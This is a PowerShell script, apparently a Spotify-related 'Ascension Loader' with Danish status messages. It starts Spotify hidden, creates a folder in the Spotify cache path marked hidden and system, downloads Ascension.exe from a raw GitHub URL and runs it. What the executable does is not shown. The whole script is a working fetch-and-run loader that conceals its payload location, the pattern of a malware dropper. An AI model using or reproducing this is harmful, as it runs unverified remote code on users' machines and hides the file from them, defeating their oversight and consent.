Write-Host "[*] Ascension Loader v3.0 - Simpel EXE Version" -ForegroundColor Cyan

$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
if (-Not (Test-Path $spotifyPath)) {
    Write-Host "[!] Spotify ikke fundet! Installer Spotify først." -ForegroundColor Red
    pause; exit
}

# Start Spotify (skjult)
if (-Not (Get-Process -Name "Spotify" -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Starter Spotify..." -ForegroundColor Yellow
    Start-Process $spotifyPath -WindowStyle Hidden
    Start-Sleep -Seconds 6
}

$loaderDir = "$env:LOCALAPPDATA\Spotify\Users\Cache\Ascension"
New-Item -ItemType Directory -Force -Path $loaderDir | Out-Null
attrib +h +s $loaderDir

$baseUrl = "https://raw.githubusercontent.com/protocolDK/protocolDKloader/main"

Write-Host "[*] Downloader Ascension.exe..." -ForegroundColor Yellow
Invoke-WebRequest -Uri "$baseUrl/files/Ascension.exe" -OutFile "$loaderDir\Ascension.exe"

Write-Host "[+] Ascension.exe downloadet" -ForegroundColor Green

Write-Host "[*] Starter Ascension..." -ForegroundColor Cyan
Start-Process "$loaderDir\Ascension.exe"

Write-Host "[+] Ascension burde åbne nu!" -ForegroundColor Green
Write-Host "[*] Tjek om vinduet dukker op." -ForegroundColor Yellow
pause
